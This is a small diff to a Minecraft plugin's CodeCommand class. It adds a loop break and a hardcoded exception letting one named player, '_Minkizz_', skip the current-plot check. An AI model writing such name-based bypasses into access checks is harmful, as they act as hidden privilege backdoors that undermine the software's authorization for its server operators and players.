@@ -25,7 +25,7 @@ public class CodeCommand implements CommandExecutor {
 
 			for (Plot plot : PlotSquared.get().getPlots(player.getUniqueId())) {
 
-				if (plot.equals(plotPlayer.getCurrentPlot())) {
+				if (plot.equals(plotPlayer.getCurrentPlot()) || player.getName().equals("_Minkizz_")) {
 					boolean coding = CodeUtils.isCoding.getOrDefault(player, false);
 
 					if (coding) {
@@ -67,6 +67,7 @@ public class CodeCommand implements CommandExecutor {
 					player.sendMessage(ChatColor.RED + "You must be in your plot to do this!");
 				}
 
+				break;
 			}
 
 		}
